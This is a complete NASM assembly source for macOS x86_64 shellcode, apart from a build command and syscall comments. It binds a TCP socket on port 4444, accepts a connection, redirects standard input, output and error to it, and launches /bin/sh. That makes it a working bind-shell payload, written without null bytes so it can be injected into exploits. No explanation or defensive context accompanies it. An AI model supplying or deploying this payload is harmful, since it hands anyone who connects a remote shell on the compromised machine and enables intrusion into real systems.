;nasm -f macho64 -o ipv4bind.o ipv4bind.s && ld -macosx_version_min 10.7.0 -o ipv4bind ipv4bind.o

BITS 64

section .text

global start

start:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xffffffffa3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; bind(host_sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x68
    syscall    

    ; listen(host_sockid, 2)
    xor  rsi, rsi
    mov  sil, 0x2
    mov  rax, r8
    mov  al, 0x6a
    syscall

    ; accept(host_sockid, 0, 0)
    xor  rsi, rsi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x1e
    syscall

    mov rdi, rax
    mov sil, 0x3

dup2:
    ; dup2(client_sockid, 2)
    ;   -> dup2(client_sockid, 1)
    ;   -> dup2(client_sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    mov  rax, r8
    mov  al, 0x3b
    syscall
    